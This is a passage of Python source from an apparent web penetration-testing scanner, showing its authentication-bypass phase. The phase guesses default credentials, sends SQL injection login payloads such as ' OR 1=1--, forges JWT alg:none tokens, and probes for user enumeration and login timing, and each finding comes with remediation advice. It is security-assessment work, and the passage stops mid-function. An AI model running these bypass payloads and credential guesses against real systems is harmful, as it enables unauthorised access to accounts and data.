def _select_cred_categories(app_name: str, server_hdr: str,
                            powered_by: str, whatweb_techs: str) -> "tuple[list, list]":
    """Select credential categories relevant to the detected tech stack.
    Returns (selected_creds, skipped_categories).
    web_generic + web_admin are always included."""
    # Build a single lowercase fingerprint string for substring matching
    _fp_blob = f"{app_name} {server_hdr} {powered_by} {whatweb_techs}".lower()

    matched_cats: set = {"web_generic", "web_admin"}
    for tech_key, cats in _TECH_CRED_MAP.items():
        if tech_key in _fp_blob:
            matched_cats.update(cats)

    selected: list = []
    skipped:  list = []
    for cat_name, creds in _CRED_CATEGORIES.items():
        if cat_name in matched_cats:
            selected.extend(creds)
        else:
            skipped.append(cat_name)

    return selected, skipped


# Legacy flat list — kept for backward compatibility if needed externally.
_DEFAULT_CREDS: list = []
for _cat_creds in _CRED_CATEGORIES.values():
    _DEFAULT_CREDS.extend(_cat_creds)

# ─────────────────────────────────────────────
# AuthProbe integration helpers
# ─────────────────────────────────────────────

def _find_authprobe_bin() -> "str | None":
    """Return path to authprobe.py, or None if not installed."""
    candidates = [
        "/opt/pr0t31n/AuthProbe/authprobe.py",
        str(Path(__file__).parent.parent / "AuthProbe" / "authprobe.py"),
    ]
    for c in candidates:
        if Path(c).exists():
            return c
    return shutil.which("authprobe")


def _run_authprobe_json(url: str, login_url: "str | None" = None,
                        username: "str | None" = None,
                        password: "str | None" = None,
                        ap_timeout: int = 30) -> "dict | None":
    """Run AuthProbe with --json and return parsed output, or None on failure."""
    authprobe = _find_authprobe_bin()
    if not authprobe:
        return None
    cmd = [sys.executable, authprobe, "--url", url, "--json", "--no-verify",
           "--timeout", str(ap_timeout)]
    if login_url:
        cmd += ["--login-url", login_url]
    if username is not None:
        cmd += ["--username", username]
    if password is not None:
        cmd += ["--password", password]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=ap_timeout + 30)
        return json.loads(r.stdout)
    except Exception:
        return None


def _probe_login_default_creds(login_url: str, target: dict,
                                out: "OutputManager",
                                cfg: "dict | None" = None) -> "dict | None":
    """Test default/weak credentials using the same auth method that
    successfully authenticated earlier in the scan.

    When *cfg* is provided and contains an enabled auth config, each
    credential pair is tested by calling ``_build_auth_session`` with the
    configured method but swapped-in username/password.  Success is verified
    by hitting a known auth-gated page from the structure map and checking
    that the response is not a login redirect.

    Falls back to AuthProbe-only testing when no auth config is available.
    Returns the first successful credential set as a dict, or None.
    """
    phase = "auth_bypass"
    auth_out = out.output_path(phase, "authprobe_" + target["hostname"])

    # ── AuthProbe fingerprint (INFO-level findings only) ─────────────────
    vc.log(f"[auth_bypass] AuthProbe fingerprinting: {login_url}", "INFO")
    fp = _run_authprobe_json(login_url, ap_timeout=30)
    app_name    = ""
    auth_method = ""
    effective_login = login_url

    if fp:
        matches = fp.get("software_matches", [])
        if matches:
            app_name = matches[0].get("name", "")
        auth_method = fp.get("auth_info_mode", "")
        login_eps   = fp.get("login_endpoints", [])
        if login_eps:
            _ep_path = login_eps[0].get("path", "")
            if _ep_path:
                effective_login = (_ep_path if _ep_path.startswith("http")
                                   else target["url"].rstrip("/") + _ep_path)

        if app_name:
            out.add_finding(
                title="Application Identified at Login Page",
                url=login_url, port=target["port"], risk="INFO",
                description=(
                    f"AuthProbe identified the application as '{app_name}' "
                    f"at {login_url}."
                ),
                output=f"Application: {app_name}",
                sources="authprobe", service=target["scheme"],
                affected=login_url, output_file=str(auth_out),
                owasp="A05:2025 Security Misconfiguration",
                nist="SI-2",
                remediation=(
                    "Ensure software version information is not exposed "
                    "in login pages or HTTP headers."
                ),
            )
        if auth_method:
            out.add_finding(
                title="Authentication Method Identified",
                url=login_url, port=target["port"], risk="INFO",
                description=(
                    f"AuthProbe identified the authentication method as "
                    f"'{auth_method}' at {login_url}."
                ),
                output=f"Auth method: {auth_method}",
                sources="authprobe", service=target["scheme"],
                affected=login_url, output_file=str(auth_out),
                owasp="A07:2025 Identification and Authentication Failures",
                nist="IA-2",
                remediation=(
                    "Ensure authentication is properly configured, hardened, "
                    "and not using default or weak credentials."
                ),
            )

    # ── Default credential testing ───────────────────────────────────────
    # Preferred path: reuse the scan's configured auth method so the test
    # goes through the exact same login flow (hidden fields, CSRF tokens,
    # multi-step gates, etc.) that proved working earlier.
    _use_cfg_auth = (
        cfg is not None
        and cfg.get("auth", {}).get("enabled")
        and cfg.get("auth", {}).get("method", cfg.get("auth", {}).get("auth_type", ""))
    )

    # Find an auth-gated page to verify login success.
    _verify_url = ""
    if _use_cfg_auth:
        try:
            _sm_path = out.root / "structure_map.json"
            if _sm_path.exists():
                _sm = json.loads(_sm_path.read_text(encoding="utf-8"))
                _CANARY_SKIP2 = frozenset({"/", "/robots.txt", "/sitemap.xml",
                                            "/favicon.ico", "/index.html"})
                for _cp2 in sorted(_sm.get("paths", {}).keys()):
                    _ci2 = _sm["paths"][_cp2]
                    if (isinstance(_ci2, dict) and _ci2.get("status") == 200
                            and _cp2 not in _CANARY_SKIP2
                            and _cp2.count("/") >= 2):
                        _verify_url = target["url"].rstrip("/") + _cp2
                        break
        except Exception:
            pass

    # ── Context-aware credential selection ─────────────────────────────
    # Read server headers and WhatWeb output from earlier phases to
    # determine which credential categories are relevant.
    _ab_server_hdr  = ""
    _ab_powered_by  = ""
    _ab_whatweb_str = ""
    try:
        _tp_path = out.root / "target_profile.json"
        if _tp_path.exists():
            _tp = json.loads(_tp_path.read_text(encoding="utf-8"))
            _ab_server_hdr  = _tp.get("server", "")
            _ab_powered_by  = _tp.get("powered_by", "")
            _ab_whatweb_str = " ".join(
                t.get("name", "") if isinstance(t, dict) else str(t)
                for t in (_tp.get("technologies") or [])
            )
            # Also include CMS detection and BI tools
            _ab_whatweb_str += " " + " ".join(
                str(c) for c in (_tp.get("cms") or [])
            )
            _ab_whatweb_str += " " + " ".join(
                str(b) for b in (_tp.get("bi_tools") or [])
            )
    except Exception:
        pass
    _ab_creds, _ab_skipped = _select_cred_categories(
        app_name, _ab_server_hdr, _ab_powered_by, _ab_whatweb_str)
    if _ab_skipped:
        _ab_skip_count = sum(
            len(_CRED_CATEGORIES[c]) for c in _ab_skipped
            if c in _CRED_CATEGORIES
        )
        vc.log(
            f"[auth_bypass] Tech stack: server={_ab_server_hdr!r}, "
            f"powered_by={_ab_powered_by!r}, app={app_name!r} — "
            f"testing {len(_ab_creds)} credentials, "
            f"skipped {_ab_skip_count} irrelevant "
            f"({', '.join(sorted(_ab_skipped))})",
            "INFO",
        )
    else:
        vc.log(
            f"[auth_bypass] No specific tech detected — testing "
            f"all {len(_ab_creds)} credentials",
            "INFO",
        )

    for uname, pwd in _ab_creds:
        _pwd_disp = repr(pwd) if pwd else "'(blank)'"
        vc.log(f"[auth_bypass] Testing default creds: {uname!r}/{_pwd_disp}", "INFO")

        _success = False
        _method_used = auth_method or "unknown"

        if _use_cfg_auth and _verify_url:
            # Build a one-off auth config with the test credentials
            _test_cfg = dict(cfg)
            _test_auth = dict(cfg["auth"])
            _test_auth["username"] = uname
            _test_auth["password"] = pwd
            _test_cfg["auth"] = _test_auth
            try:
                _test_sess = _build_auth_session(
                    _test_cfg, no_interactive=True, quiet=True)
                if _test_sess:
                    # Verify: hit the auth-gated page and check for real content
                    _vr = _test_sess.get(_verify_url, timeout=cfg.get("timeout", 10),
                                         allow_redirects=True)
                    if _vr and _vr.status_code == 200 and not _inj_is_login_page(_vr):
                        _success = True
                        _method_used = (cfg["auth"].get("method")
                                        or cfg["auth"].get("auth_type")
                                        or "form_login")
            except Exception:
                pass
        else:
            # Fallback: AuthProbe-only testing (no auth config available)
            result = _run_authprobe_json(login_url, login_url=effective_login,
                                         username=uname, password=pwd, ap_timeout=10)
            if result and any(v.get("success") for v in result.get("validation_results", [])):
                _success = True

        if _success:
            try:
                auth_out.write_text(
                    f"# Default Credentials Found\n"
                    f"URL: {login_url}\n"
                    f"Username: {uname}\nPassword: {pwd}\n"
                    f"Auth method: {_method_used}\n",
                    encoding="utf-8",
                )
            except Exception:
                pass
            out.add_finding(
                title="Weak or Default Credentials Accepted",
                url=login_url, port=target["port"], risk="CRITICAL",
                description="The target accepted well-known default or factory-set credentials, granting unauthorised access.",
                output=(
                    f"Username: {uname}\nPassword: {pwd}\n"
                    f"Auth method: {_method_used}"
                ),
                sources="fracture-auth-bypass", service=target["scheme"],
                affected=login_url, output_file=str(auth_out),
                owasp="A07:2025 Identification and Authentication Failures",
                nist="IA-5",
                remediation="Replace all default credentials with strong, unique secrets and enforce a password policy prior to any deployment.",
            )
            vc.log(f"[auth_bypass] Default creds accepted: {uname!r}/{pwd!r}",
                   "SUCCESS")
            out.log_action_item(
                type="cross_tool_credential",
                recommended_tool="isotope",
                target=f"{target['ip']}:{target['port']}",
                ip=target["ip"], port=target["port"],
                hostname=target.get("hostname", ""),
                title="Credential Validation — Default Creds Confirmed",
                description=(
                    f"Fracture confirmed default credentials ({uname}) accepted "
                    f"at {login_url}. Run Isotope to test credential reuse "
                    f"across other services on this host and network, and to "
                    f"validate password policy enforcement."),
                source_finding="default_credentials",
                priority="HIGH", scope="webapp",
            )
            return {"username": uname, "password": pwd,
                    "auth_method": _method_used, "login_url": login_url}

    return None


_SQLI_BYPASS_PAYLOADS = [
    ("admin'--",    "anything"),
    ("' OR 1=1--",  "anything"),
    ("' OR '1'='1", "anything"),
    ("admin' #",    "anything"),
]


def _phase_auth_bypass(target: dict, cfg: dict, pm: ProgressManager,
                       out: OutputManager, sess: requests.Session,
                       crawl_data: dict) -> list:
    phase      = "auth_bypass"
    url        = target["url"]
    timeout    = cfg.get("timeout", 10)
    forms      = crawl_data.get("forms", [])
    _discovered: list = []
    vc.status(phase, "Auth Bypass", "running", "Default credentials", 0, 4)

    # Shared evidence log for this phase — all findings reference this file
    auth_out = out.output_path(phase, "auth_bypass_" + target["hostname"])
    auth_out.write_text(
        f"# Auth Bypass Testing — {url}\n\n", encoding="utf-8"
    )

    # Find login forms
    login_forms = [f for f in forms if re.search(r'login|signin|auth', f.get("action", ""), re.I)
                   or any(i.get("type") == "password" for i in f.get("inputs", []))]

    for form in login_forms[:3]:
        action  = form.get("action", url)
        method  = form.get("method", "POST")
        inputs  = form.get("inputs", [])
        user_f  = next((i["name"] for i in inputs if re.search(r'user|email|login', i["name"], re.I)), None)
        pass_f  = next((i["name"] for i in inputs if i.get("type") == "password"), None)

        if not user_f or not pass_f:
            continue

        # 1. Default credentials — reuse configured auth method when available
        _form_url = (action if action.startswith("http")
                     else url.rstrip("/") + "/" + action.lstrip("/"))
        _dc = _probe_login_default_creds(_form_url, target, out, cfg=cfg)
        if _dc:
            _discovered.append(_dc)

        vc.status(phase, "Auth Bypass", "running", "SQLi login bypass", 1, 4)
        # 2. SQLi in login — baseline-gated.
        # Fetch the login form with invalid creds to get a baseline "failed
        # login" response.  A real bypass changes the response materially
        # (redirect to dashboard, different page content, etc.).
        _sqli_bl = None
        try:
            _bl_data = {i["name"]: "" for i in inputs if i.get("name")}
            _bl_data[user_f] = "fracture_invalid_user"
            _bl_data[pass_f] = "fracture_invalid_pass"
            _sqli_bl = sess.post(action, data=_bl_data, timeout=timeout,
                                 allow_redirects=True)
        except Exception:
            pass
        for usr_pay, pwd_pay in _SQLI_BYPASS_PAYLOADS:
            data = {i["name"]: "" for i in inputs if i.get("name")}
            data[user_f] = usr_pay
            data[pass_f] = pwd_pay
            try:
                r = sess.post(action, data=data, timeout=timeout, allow_redirects=True)
                if not r or r.status_code not in (200, 301, 302, 303):
                    continue
                # Must NOT still be a login page (ASP.NET returns 200 for everything)
                if _inj_is_login_page(r):
                    continue
                # Must differ materially from the baseline failed-login response
                if _sqli_bl:
                    _bl_len = len(_sqli_bl.text)
                    if abs(len(r.text) - _bl_len) < max(100, _bl_len * 0.10):
                        continue  # Same page re-rendered — not a bypass
                # Also reject if the response still looks like a login form
                if re.search(r'login|invalid|incorrect|failed|sign.in|password', r.text[:3000], re.I):
                    continue
                with auth_out.open("a", encoding="utf-8") as _af:
                    _af.write(
                        f"## SQLi Login Bypass\n"
                        f"URL: {action}\nPayload: {usr_pay}\n"
                        f"Response: {r.status_code}\n{r.text[:2000]}\n\n"
                    )
                out.add_finding(
                    title="Authentication Bypass via SQL Injection",
                    url=action, port=target["port"], risk="CRITICAL",
                    description=f"Login form at {action} is vulnerable to SQL injection authentication bypass.",
                    output=f"Payload: {usr_pay}\nResponse: {r.status_code}",
                    sources="fracture-auth-bypass", service=target["scheme"],
                    affected=action, output_file=str(auth_out),
                    owasp="A07:2025 Identification and Authentication Failures",
                    nist="IA-5",
                    remediation="Use parameterised queries for login. Implement account lockout.",
                    http_code=r.status_code,
                )
                vc.log(f"[auth_bypass] Login SQLi bypass at {action}", "SUCCESS")
                out.log_action_item(
                    type="cross_tool_credential",
                    recommended_tool="isotope",
                    target=f"{target['ip']}:{target['port']}",
                    ip=target["ip"], port=target["port"],
                    hostname=target.get("hostname", ""),
                    title="Auth Bypass Confirmed — Credential Extraction",
                    description=(
                        f"Fracture bypassed authentication via SQLi at "
                        f"{action}. Run Isotope to extract credentials from "
                        f"the backend database, test credential reuse across "
                        f"services, and validate other authentication "
                        f"mechanisms on this host."),
                    source_finding="sqli_auth_bypass",
                    priority="CRITICAL", scope="webapp",
                )
                break
            except Exception:
                pass

    vc.status(phase, "Auth Bypass", "running", "Account enumeration", 2, 4)
    # 3. Account enumeration via password reset
    reset_paths = ["/forgot-password", "/reset-password", "/account/recover",
                   "/password-reset", "/auth/forgot"]
    for rpath in reset_paths:
        try:
            r = sess.get(url + rpath, timeout=timeout)
            if r.status_code == 200:
                # Check if responses differ for valid vs invalid users
                vc.log(f"[auth_bypass] Password reset endpoint found: {rpath}", "INFO")
                with auth_out.open("a", encoding="utf-8") as _af:
                    _af.write(
                        f"## Password Reset Endpoint\n"
                        f"Path: {rpath}\nResponse: {r.status_code}\n{r.text[:2000]}\n\n"
                    )
                out.add_finding(
                    title="Discovery: Password Reset Endpoint Exposed",
                    url=url + rpath, port=target["port"], risk="INFO",
                    description=f"Password reset endpoint found at {rpath}. Test for account enumeration by submitting valid/invalid usernames.",
                    output=f"GET {rpath} → {r.status_code}",
                    sources="fracture-auth-bypass", service=target["scheme"],
                    affected=url + rpath, output_file=str(auth_out),
                    owasp="A07:2025 Identification and Authentication Failures",
                    nist="IA-5",
                    remediation="Ensure password reset returns a consistent message regardless of whether the email exists.",
                    http_code=r.status_code,
                )
                # GAP-34: Check if reset link puts token in URL query
                _reset_body = r.text or ""
                _reset_token_url = re.search(
                    r'(?:href|action)=["\']([^"\']*(?:token|reset|key|code)=[^"\']{8,})',
                    _reset_body, re.I)
                if _reset_token_url:
                    out.add_finding(
                        title="Password Reset Token Exposed in URL",
                        url=url + rpath, port=target["port"], risk="MEDIUM",
                        description=(
                            f"The password reset page at {rpath} includes a reset "
                            f"token in the URL query string. Tokens in URLs are "
                            f"logged in server access logs, browser history, proxy "
                            f"caches, and Referer headers. CWE-598."
                        ),
                        output=f"Token URL pattern: {_reset_token_url.group(1)[:120]}",
                        sources="fracture-auth-bypass", service=target["scheme"],
                        affected=url + rpath, output_file=str(auth_out),
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="IA-5",
                        remediation=(
                            "Transmit password reset tokens via POST body or HTTP "
                            "headers, not URL query parameters. Implement short-lived, "
                            "single-use tokens with cryptographic randomness."
                        ),
                        http_code=r.status_code,
                    )
                    vc.log(f"[auth_bypass] Reset token in URL at {rpath}", "SUCCESS")
                break
        except Exception:
            pass

    vc.status(phase, "Auth Bypass", "running", "JWT none algorithm", 3, 4)
    # 4. JWT none algorithm check — look for JWT in cookies/headers
    for cookie in sess.cookies:
        val = cookie.value or ""
        if re.match(r'eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.', val):
            try:
                import base64 as _b64
                parts = val.split(".")
                padded = parts[0] + "=" * (-len(parts[0]) % 4)
                header = json.loads(_b64.urlsafe_b64decode(padded).decode("utf-8", errors="replace"))
                alg    = header.get("alg", "")
                if alg.lower() in ("hs256", "rs256"):
                    # Construct 'none' algorithm token
                    none_header = _b64.urlsafe_b64encode(
                        json.dumps({"alg": "none", "typ": "JWT"}).encode()
                    ).rstrip(b"=").decode()
                    none_token = f"{none_header}.{parts[1]}."
                    test_sess = _make_session(cfg)
                    test_sess.cookies.set(cookie.name, none_token)
                    r = test_sess.get(url, timeout=timeout)
                    if r.status_code == 200:
                        with auth_out.open("a", encoding="utf-8") as _af:
                            _af.write(
                                f"## JWT None Algorithm Bypass\n"
                                f"Cookie: {cookie.name}\nToken: {none_token[:80]}\n"
                                f"Response: {r.status_code}\n{r.text[:2000]}\n\n"
                            )
                        out.add_finding(
                            title="JWT None Algorithm Authentication Bypass",
                            url=url, port=target["port"], risk="CRITICAL",
                            description="The application accepts JSON Web Tokens specifying the alg:none algorithm, allowing an attacker to forge arbitrary tokens without possessing a signing key and bypass authentication entirely.",
                            output=f"Cookie: {cookie.name}\nToken: {none_token[:80]}",
                            sources="fracture-auth-bypass", service=target["scheme"],
                            output_file=str(auth_out),
                            owasp="A07:2025 Identification and Authentication Failures",
                            nist="IA-5",
                            remediation="Enforce a strict server-side algorithm allowlist; reject any token where the alg header is none, empty, or not in the permitted set; never rely on the token header to select the verification algorithm.",
                            http_code=r.status_code,
                        )
                        vc.log("[auth_bypass] JWT none algorithm accepted!", "SUCCESS")
                        out.log_action_item(
                            type="cross_tool_credential",
                            recommended_tool="isotope",
                            target=f"{target['ip']}:{target['port']}",
                            ip=target["ip"], port=target["port"],
                            hostname=target.get("hostname", ""),
                            title="JWT None-Alg Bypass — Token Forging",
                            description=(
                                f"Fracture confirmed JWT alg:none bypass at "
                                f"{url}. Run Isotope to forge tokens for "
                                f"privilege escalation, test admin access, "
                                f"and enumerate protected endpoints with "
                                f"forged JWT credentials."),
                            source_finding="jwt_none_alg_bypass",
                            priority="CRITICAL", scope="webapp",
                        )
            except Exception:
                pass

    vc.status(phase, "Auth Bypass", "running", "JWT claim inspection", 4, 7)
    # 5. JWT Missing Expiry claim
    for cookie in sess.cookies:
        val = cookie.value or ""
        if re.match(r'eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.', val):
            try:
                import base64 as _b64j
                parts = val.split(".")
                payload_padded = parts[1] + "=" * (-len(parts[1]) % 4)
                jwt_payload = json.loads(_b64j.urlsafe_b64decode(payload_padded).decode("utf-8", errors="replace"))
                if "exp" not in jwt_payload:
                    out.add_finding(
                        title="JWT — Missing Expiry Claim (No exp)",
                        url=url, port=target["port"], risk="MEDIUM",
                        description=(f"The JWT in cookie '{cookie.name}' has no 'exp' claim. "
                                     f"Without an expiry, the token is valid indefinitely and cannot "
                                     f"be invalidated server-side after issuance."),
                        output=f"Cookie: {cookie.name}\nJWT payload: {json.dumps(jwt_payload)[:300]}",
                        sources="fracture-auth-bypass", service=target["scheme"],
                        output_file=str(auth_out),
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="IA-5",
                        remediation="Always include an 'exp' claim in JWTs. Set a short expiry (≤15 minutes for sensitive operations).",
                    )
                    vc.log(f"[auth_bypass] JWT missing exp: {cookie.name}", "SUCCESS")
            except Exception:
                pass

    vc.status(phase, "Auth Bypass", "running", "Credentials in URL", 5, 7)
    # 6. Credentials transmitted in URL query parameters
    _cred_param_re = re.compile(
        r'[?&](password|passwd|pwd|secret|token|api_key|apikey|auth|access_token)'
        r'=([^&\s]{4,})', re.I
    )
    for link in crawl_data.get("links", []):
        if _cred_param_re.search(link):
            m = _cred_param_re.search(link)
            _cred_ev = ""
            try:
                _cred_ev_path = out.output_path(phase, f"cred_url_{m.group(1)}")
                _cred_ev_path.write_text(
                    f"Credentials in URL Query Parameters\n"
                    f"URL: {link}\nParameter: {m.group(1)}\n"
                    f"Value (redacted): {'*' * len(m.group(2))}\n",
                    encoding="utf-8")
                _cred_ev = str(_cred_ev_path)
            except Exception:
                pass
            out.add_finding(
                title="Information Disclosure: Credentials in URL Query Parameters",
                url=link, port=target["port"], risk="HIGH",
                description=(f"Sensitive credential parameter '{m.group(1)}' found in URL query string. "
                             f"URLs containing credentials are logged by proxies, referrer headers, "
                             f"and browser history, exposing them to unintended disclosure."),
                output=f"URL: {link}\nParameter: {m.group(1)}",
                sources="fracture-auth-bypass", service=target["scheme"],
                output_file=_cred_ev,
                affected=link,
                owasp="A07:2025 Identification and Authentication Failures",
                nist="IA-5",
                remediation="Transmit credentials only in request body or headers, never in URL query parameters.",
            )
            vc.log(f"[auth_bypass] Credentials in URL: {link[:80]}", "SUCCESS")

    vc.status(phase, "Auth Bypass", "running", "Timing attack probe", 6, 8)
    # 7. Timing attack — non-constant-time comparison on login
    # Uses the KNOWN username from cfg["auth"] so the "valid user" probe
    # is actually valid.  Hardcoding "admin" is unreliable — we don't
    # know that username exists in the target system.  If no known
    # username was provided, skip the probe entirely.
    import time as _time_ab
    _timing_auth = cfg.get("auth", {})
    _timing_known_user = (_timing_auth.get("username") or "").strip()
    _timing_user_field = _timing_auth.get("login_username_field", "username")
    _timing_pass_field = _timing_auth.get("login_password_field", "password")
    if not _timing_known_user:
        vc.log("[auth_bypass] Timing probe: skipped — no known username in auth config", "INFO")
    _timing_login_paths = ["/login", "/auth/login", "/api/login", "/signin", "/auth/token"]
    for lpath in (_timing_login_paths if _timing_known_user else []):
        try:
            login_u = url + lpath
            times_invalid = []
            times_valid_fmt = []
            _timing_resp_invalid = None
            _timing_resp_valid   = None
            # Probe with clearly invalid username vs. the KNOWN valid username
            for _ in range(5):
                t0 = _time_ab.monotonic()
                _timing_resp_invalid = sess.post(login_u, json={_timing_user_field: "zzznouserzzzz", _timing_pass_field: "wrong"}, timeout=timeout)
                times_invalid.append(_time_ab.monotonic() - t0)
            for _ in range(5):
                t0 = _time_ab.monotonic()
                _timing_resp_valid = sess.post(login_u, json={_timing_user_field: _timing_known_user, _timing_pass_field: "wrong_password_xyz"}, timeout=timeout)
                times_valid_fmt.append(_time_ab.monotonic() - t0)
            if times_invalid and times_valid_fmt:
                avg_invalid = sum(times_invalid) / len(times_invalid)
                avg_valid   = sum(times_valid_fmt) / len(times_valid_fmt)
                # Gate: both probes must return the SAME status code.
                # Different codes mean different server code paths (error
                # redirect vs backend timeout, etc.) — the timing delta
                # reflects routing, not credential-comparison timing.
                _sc_inv = _timing_resp_invalid.status_code if _timing_resp_invalid else 0
                _sc_val = _timing_resp_valid.status_code   if _timing_resp_valid   else 0
                if _sc_inv != _sc_val:
                    vc.log(
                        f"[auth_bypass] Timing probe at {lpath}: skipped — "
                        f"status codes differ ({_sc_inv} vs {_sc_val}), "
                        f"delta {(avg_valid-avg_invalid)*1000:.0f}ms not attributable "
                        f"to credential comparison", "INFO")
                    continue
                # Also skip when either probe hit an error page redirect
                # (3xx) or server error (5xx) — the timing is unreliable.
                if (_sc_inv >= 500 or _sc_val >= 500
                        or 300 <= _sc_inv < 400 or 300 <= _sc_val < 400):
                    vc.log(
                        f"[auth_bypass] Timing probe at {lpath}: skipped — "
                        f"HTTP {_sc_inv}/{_sc_val} (server error or redirect)", "INFO")
                    continue
                # If valid-format username is consistently >150ms slower, timing oracle likely
                if avg_valid - avg_invalid > 0.15:
                    _timing_evidence: list = []
                    _timing_http_code = 0
                    try:
                        if _timing_resp_invalid is not None:
                            _rq, _rp = _save_http_evidence(
                                out, phase, "timing_invalid_user",
                                _timing_resp_invalid, endpoint_url=login_u, method="POST")
                            _timing_evidence.extend([_rq, _rp])
                        if _timing_resp_valid is not None:
                            _rq, _rp = _save_http_evidence(
                                out, phase, "timing_valid_fmt_user",
                                _timing_resp_valid, endpoint_url=login_u, method="POST")
                            _timing_evidence.extend([_rq, _rp])
                            _timing_http_code = _timing_resp_valid.status_code
                    except Exception:
                        pass
                    out.add_finding(
                        title="Timing Attack — Non-Constant-Time Authentication",
                        url=login_u, port=target["port"], risk="MEDIUM",
                        description=(f"Login endpoint {lpath} shows a {(avg_valid - avg_invalid)*1000:.0f}ms "
                                     f"average response time difference between a non-existent username and "
                                     f"the known valid username, suggesting non-constant-time comparison. "
                                     f"Both probes returned HTTP {_sc_val}. "
                                     f"An attacker can use this timing oracle for username enumeration."),
                        output=(f"Avg time (invalid user): {avg_invalid*1000:.0f}ms\n"
                                f"Avg time (known valid user): {avg_valid*1000:.0f}ms\n"
                                f"Delta: {(avg_valid-avg_invalid)*1000:.0f}ms\n"
                                f"HTTP status (both probes): {_sc_val}"),
                        output_file=",".join(_timing_evidence) if _timing_evidence else None,
                        sources="fracture-auth-bypass", service=target["scheme"],
                        affected=login_u,
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="IA-5",
                        http_code=_timing_http_code,
                        remediation=(
                            "Use constant-time comparison functions for all credential checks. "
                            "Hash credentials before comparison and add artificial jitter to login response times."
                        ),
                    )
                    vc.log(f"[auth_bypass] Timing oracle at {lpath} ({(avg_valid-avg_invalid)*1000:.0f}ms delta)", "SUCCESS")
                    break
        except Exception:
            pass

    # ── User enumeration via response differential (#1 FR-456) ──────────────
    vc.status(phase, "Auth Bypass", "running", "User enumeration differential", 7, 9)
    _ENUM_PLAUSIBLE_USERS = ("admin", "administrator", "user", "test", "root",
                             "guest", "info", "support", "webmaster")
    _enum_results: list = []
    for form in login_forms[:3]:
        action = form.get("action", url)
        method = form.get("method", "POST").upper()
        inputs = form.get("inputs", [])
        user_f = next((i["name"] for i in inputs
                       if re.search(r'user|email|login|name|account', i.get("name", ""), re.I)), None)
        pass_f = next((i["name"] for i in inputs
                       if i.get("type", "").lower() == "password"
                       or re.search(r'pass|pwd|secret', i.get("name", ""), re.I)), None)
        if not user_f or not pass_f:
            continue
        # Harvest hidden fields for stateful forms
        _enum_hidden: dict = {}
        try:
            _enum_fp = sess.get(action, timeout=timeout)
            if _enum_fp.status_code == 200:
                for _hm in re.finditer(
                        r'<input[^>]+type=["\']?hidden["\']?[^>]*>', _enum_fp.text, re.I):
                    _htag = _hm.group(0)
                    _hn = re.search(r'name=["\']([^"\']+)["\']', _htag)
                    _hv = re.search(r'value=["\']([^"\']*)["\']', _htag)
                    if _hn:
                        _enum_hidden[_hn.group(1)] = _hv.group(1) if _hv else ""
        except Exception:
            pass
        # Probe: definitely-invalid username
        _invalid_user = "fracture_no_such_user_xz9q"
        _invalid_data = {**_enum_hidden, user_f: _invalid_user, pass_f: "wrong_pass_abc"}
        _r_invalid = None
        _t_invalid = 0.0
        try:
            import time as _t_enum
            _t0 = _t_enum.monotonic()
            _r_invalid = (sess.post(action, data=_invalid_data, timeout=timeout, allow_redirects=True)
                          if method == "POST"
                          else sess.get(action, params=_invalid_data, timeout=timeout))
            _t_invalid = _t_enum.monotonic() - _t0
        except Exception:
            continue
        if _r_invalid is None:
            continue
        _invalid_body = _r_invalid.text or ""
        _invalid_status = _r_invalid.status_code
        _invalid_len = len(_invalid_body)
        # Strip dynamic tokens from body for comparison
        _invalid_stripped = re.sub(r'value=["\'][^"\']*["\']', 'value=""', _invalid_body[:8000])
        # Probe: plausible usernames
        for _pu in _ENUM_PLAUSIBLE_USERS:
            _valid_data = {**_enum_hidden, user_f: _pu, pass_f: "wrong_pass_abc"}
            _r_valid = None
            _t_valid = 0.0
            try:
                _t0 = _t_enum.monotonic()
                _r_valid = (sess.post(action, data=_valid_data, timeout=timeout, allow_redirects=True)
                            if method == "POST"
                            else sess.get(action, params=_valid_data, timeout=timeout))
                _t_valid = _t_enum.monotonic() - _t0
            except Exception:
                continue
            if _r_valid is None:
                continue
            _valid_body = _r_valid.text or ""
            _valid_status = _r_valid.status_code
            _valid_len = len(_valid_body)
            _valid_stripped = re.sub(r'value=["\'][^"\']*["\']', 'value=""', _valid_body[:8000])
            # Differential checks
            _diffs: list = []
            if _invalid_status != _valid_status:
                _diffs.append(f"Status code: {_invalid_status} vs {_valid_status}")
            if _invalid_len > 0 and abs(_valid_len - _invalid_len) / max(_invalid_len, 1) > 0.10:
                _diffs.append(f"Body length: {_invalid_len} vs {_valid_len} ({abs(_valid_len - _invalid_len)} diff)")
            if _invalid_stripped != _valid_stripped:
                _diff_ratio = sum(1 for a, b in zip(_invalid_stripped[:2000], _valid_stripped[:2000]) if a != b)
                if _diff_ratio > 20:
                    _diffs.append(f"Body content differs ({_diff_ratio} char differences in first 2000)")
            if _diffs:
                _enum_evidence: list = []
                try:
                    _rq1, _rp1 = _save_http_evidence(
                        out, phase, f"enum_invalid_{_invalid_user}",
                        _r_invalid, endpoint_url=action, method=method)
                    _enum_evidence.extend([_rq1, _rp1])
                    _rq2, _rp2 = _save_http_evidence(
                        out, phase, f"enum_plausible_{_pu}",
                        _r_valid, endpoint_url=action, method=method)
                    _enum_evidence.extend([_rq2, _rp2])
                except Exception:
                    pass
                _enum_results.append({
                    "action": action,
                    "invalid_user": _invalid_user,
                    "plausible_user": _pu,
                    "diffs": _diffs,
                    "evidence": _enum_evidence,
                    "http_code": _valid_status,
                })
                vc.log(f"[auth_bypass] User enumeration: {action} — '{_pu}' differs from invalid user", "SUCCESS")
                break
    if _enum_results:
        _all_ev: list = []
        _out_lines: list = []
        for _er in _enum_results:
            _out_lines.append(
                f"Endpoint: {_er['action']}\n"
                f"  Invalid user: {_er['invalid_user']}\n"
                f"  Plausible user: {_er['plausible_user']}\n"
                f"  Differentials: " + "; ".join(_er['diffs'])
            )
            _all_ev.extend(_er['evidence'])
        out.add_finding(
            title="Enumeration: Application Responses Identify Valid Accounts",
            url=_enum_results[0]["action"], port=target["port"], risk="MEDIUM",
            description=(
                f"Login endpoint responses differ between invalid and plausible "
                f"usernames, allowing an attacker to enumerate valid accounts. "
                f"Differentials include status code, body length, or content "
                f"changes. {len(_enum_results)} endpoint(s) affected."
            ),
            output="\n\n".join(_out_lines)[:3000],
            output_file=",".join(str(e) for e in _all_ev) if _all_ev else "",
